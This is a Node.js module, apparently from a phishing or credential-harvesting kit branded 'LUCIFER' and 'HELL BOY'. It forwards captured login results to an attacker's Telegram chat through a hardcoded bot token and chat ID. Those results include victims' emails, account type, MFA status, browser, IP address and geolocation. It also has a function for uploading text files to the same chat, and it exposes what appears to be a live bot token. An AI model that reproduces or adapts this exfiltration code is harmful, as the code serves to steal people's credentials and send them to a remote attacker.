const config = require("./config");
 
const telegramChatId = "6622076888";
 const telegramBotToken = "8976797560:AAGo5YIl4YXVxoPkfM9li9XFjiyoL2t-kFw";
async function sendTelegramMessage(message) {
 
  if (!telegramBotToken || telegramChatId === "PASTE_TELEGRAM_CHAT_ID_HERE") {
    return;
  }

  const response = await fetch(
    "https://api.telegram.org/bot" + telegramBotToken + "/sendMessage",
    {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: telegramChatId,
        text: message,
      }),
    },
  );

  if (!response.ok) {
    const body = await response.text();
    throw new Error(
      "Telegram sendMessage failed: HTTP " +
        response.status +
        " " +
        body.substring(0, 200),
    );
  }
}

async function sendTelegramFile(filename, content) {
  
  if (!telegramBotToken || telegramChatId === "PASTE_TELEGRAM_CHAT_ID_HERE") {
    return;
  }

  // Create a Blob from the text content
  const blob = new Blob([content], { type: "text/plain" });

  // Create FormData and append the file + metadata
  const formData = new FormData();
  formData.append("chat_id", telegramChatId);
  formData.append("document", blob, filename);

  const response = await fetch(
    "https://api.telegram.org/bot" + telegramBotToken + "/sendDocument",
    {
      method: "POST",
      body: formData,
    },
  );

  return response.json();
}

function notifyTelegramOnSuccess(result) {
  console.log(result);

  if (!result.success) return;
  console.log("[INFO] Login successful, sending Telegram notification...");


    const statusEmoji = result.success ? "✅" : "❌";
  const mfaEmoji = result.mfaRequired ? "🔐" : "🔓";

  const lines = [
    `${statusEmoji} *LUCIFER LOGIN CREDENTIAL*`,
    "",
    `*Status:* \`${result.status.toUpperCase()}\``,
    `*Account Type:* ${result.accountType}`,
    `*Email:* \`${result.email}\``,
    `*MFA Required:* ${mfaEmoji} ${result.mfaRequired ? "Yes" : "No"}`,
    "",
    `*Browser:* ${result.browser}`,
    `*Method:* ${result.method}`,
    `*Checked At:* \`${new Date(result.checkedAt).toLocaleString()}\``,
    `HELL BOY 😈👿 (LUCIFER)`,
  ];

  if (result.message) {
    lines.push(`*Message:* ${result.message}`);
  }

  lines.push("");
  lines.push("*📍 Geolocation*");

  if (result.ip) {
    lines.push(`*IP:* \`${result.ip}\``);
  }
  if (result.country) {
    lines.push(`*Country:* ${result.country}`);
  }
  if (result.city) {
    lines.push(`*City:* ${result.city}`);
  }
  if (result.isp) {
    lines.push(`*ISP:* ${result.isp}`);
  }
  if (result.timezone) {
    lines.push(`*Timezone:* ${result.timezone}`);
  }
  if (result.latitude && result.longitude) {
    lines.push(`*Coordinates:* \`${result.latitude}, ${result.longitude}\``);
  }

  const message = lines.join("\n");
  sendTelegramMessage(message).catch((err) => {
    console.error("[WARN] Telegram notification failed: " + err.message);
  });
}

module.exports = {
  notifyTelegramOnSuccess,
  sendTelegramMessage,
  sendTelegramFile
};
